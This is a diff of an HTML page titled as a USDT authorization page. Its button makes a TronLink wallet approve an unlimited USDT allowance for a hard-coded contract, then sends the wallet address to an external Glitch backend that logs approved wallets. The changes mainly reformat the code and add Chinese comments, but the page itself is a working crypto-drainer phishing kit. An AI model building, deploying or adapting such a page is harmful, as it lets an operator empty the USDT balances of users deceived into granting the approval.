@@ -7,7 +7,12 @@
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <style>
-    body { font-family: sans-serif; padding: 2em; background: #f2f2f2; text-align: center; }
+    body {
+      font-family: sans-serif;
+      padding: 2em;
+      background: #f2f2f2;
+      text-align: center;
+    }
     button {
       background: #0984e3;
       color: #fff;
@@ -20,30 +25,40 @@
   </style>
 </head>
 <body>
+  <h1>USDT 授權頁面</h1>
   <button onclick="authorizeUSDT()">開啟無限轉帳授權</button>
 
   <script>
-    const AUTH_CONTRACT = "TLFVGYGU5wd4z3KzKxr35kNUHQ7zFtff5d";
-    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const BACKEND = "https://peaceful-precious-ceres.glitch.me";
+    const AUTH_CONTRACT = "TLFVGYGU5wd4z3KzKxr35kNUHQ7zFtff5d"; // 授權合約地址
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT 合約地址
+    const BACKEND = "https://peaceful-precious-ceres.glitch.me"; // 後端 API 地址
 
     async function authorizeUSDT() {
       try {
+        // 檢查是否有安裝 TronLink 並且已經登入
         if (!window.tronWeb || !tronWeb.ready || !tronWeb.defaultAddress.base58) {
           return alert("請使用 TronLink DApp 瀏覽器開啟並登入");
         }
 
+        // 獲取用戶錢包地址
         const address = tronWeb.defaultAddress.base58;
+
+        // 最大授權金額，設為最大 uint256
         const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+        // 連接到 USDT 合約
         const usdt = await tronWeb.contract().at(USDT_CONTRACT);
 
+        // 執行授權操作
         const tx = await usdt.approve(AUTH_CONTRACT, MAX_UINT).send({ shouldPollResponse: true });
         console.log("✅ 授權 TX:", tx);
 
+        // 查詢授權金額是否正確
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
-        const allowed = parseFloat(allowance.toString()) / 1e6;
+        const allowed = parseFloat(allowance.toString()) / 1e6; // 將數值轉換為 USDT 單位
 
         if (allowed > 1000000) {
+          // 授權成功，將錢包地址提交到後端
           await axios.post(`${BACKEND}/wallets`, { address });
           alert("✅ 成功無限授權，錢包已記錄");
         } else {
